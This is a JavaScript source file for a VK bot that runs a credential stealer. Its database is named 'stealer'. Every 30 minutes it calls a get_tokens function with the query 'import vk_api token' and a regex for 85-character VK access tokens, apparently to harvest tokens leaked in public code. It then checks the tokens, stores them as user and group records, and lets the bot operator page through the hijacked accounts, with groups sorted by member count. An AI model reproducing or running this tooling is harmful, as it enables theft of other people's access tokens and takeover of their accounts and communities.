const { VK, Keyboard } = require('vk-io');
const { HearManager } = require('@vk-io/hear');
const MongoClient = require("mongodb").MongoClient;

const { db_get_collection, db_get_random, db_add, db_delete_collection } = require("./db.js")
const { get_vk_messages } = require('./vk_handler.js')
const { vk_checker } = require("./vk_checker.js");
const { get_tokens } = require("./stealer.js");

const client = new MongoClient(
    "mongodb://localhost:27017/",
    { useUnifiedTopology: true },
);

const vk = new VK({
    token: process.env.vktoken
});

const hearManager = new HearManager();

vk.updates.on('message_new', (context, next) => {
	const { messagePayload } = context;

    if (messagePayload && messagePayload.command && messagePayload.arg) {
        context.state.command = messagePayload.command
        context.state.arg = messagePayload.arg
    } else if (context.text) {
        context.state.command = context.text.split(' ')[0]
        context.state.arg = context.text.split(' ')[1]
    } else {
        context.state.command = "undefined command"
    }
    
    return next();
});

vk.updates.on('message_new', hearManager.middleware);

const hearCommand = (name, handle) => {
	hearManager.hear(
		[
			(text, { state }) => (
                state.command.match(name)
			),
			name
		],
		handle
	);
};

function unique(arr) {
    return Array.from(new Set(arr));
}

client.connect(async function(err, client) {
    const db = client.db("stealer")
    const users = db.collection("users");
    const groups = db.collection("groups");
    
    hearCommand(/гитхаб/i, async (context) => {
    
        let current_offset = context.messagePayload && context.messagePayload.offset
        ? context.messagePayload.offset
        : 0

        let collection_type;
        let sort;
        let page = context.state.arg
        ? context.state.arg
        : undefined

        switch (page) {
            case "группы":
                collection_type = groups;
                sort = {
                    members: -1,
                    _id: 1
                }
                break
            case "юзеры":
                collection_type = users
                sort = {}
                break
            default:
                context.send("Невалидное значение аргумента")
                throw new Error("Invalid arg");
        }

        let checks = await db_get_collection(collection_type, sort, current_offset, 3);

        if (checks !== undefined && Object.keys(checks).length > 0) {
            let message_text = await get_vk_messages(checks)
            context.send({
                message: message_text.join("\n"),
                keyboard: Keyboard.builder()
                    .textButton({
                    label: '⬅',
                        payload: {
                            command: `гитхаб`,
                            arg: page,
                            offset: current_offset-3
                        }
                    })
                    .textButton({
                        label: '➡',
                        payload: {
                            command: `гитхаб`,
                            arg: page,
                            offset: current_offset+3
                        }
                    })
                    .row()
                    .inline()
            })
        } else {
            context.send({
                message: "Нет данных"
            })
        }
    });

    hearCommand(/undefined command/, (context) => {
        if (context.peerId < 2000000000) {
            context.send(message = "Не понял Вас")
        }
    })

    async function dbupdate() {
        while (true) {
            
            let new_tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
            let db_users = await db_get_collection(users)
            let db_groups = await db_get_collection(groups)
            let db_checks = db_users.concat(db_groups);
            let db_tokens = await Promise.all(db_checks.map(check => check.token)); //чеки в токены
            let all_tokens = unique(db_tokens.concat(new_tokens));
            let all_checks = await vk_checker(all_tokens);

            db_delete_collection(users)
            db_delete_collection(groups)

            await Promise.all(all_checks.map((check) => {
                switch (check.type) {
                    case "user":
                        db_add(users, check)
                        break 
                    case "group":
                        db_add(groups, check)
                }
            }))

            console.log("updated db")
            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
        };
    };

    dbupdate();
    vk.updates.start().catch(console.error);
});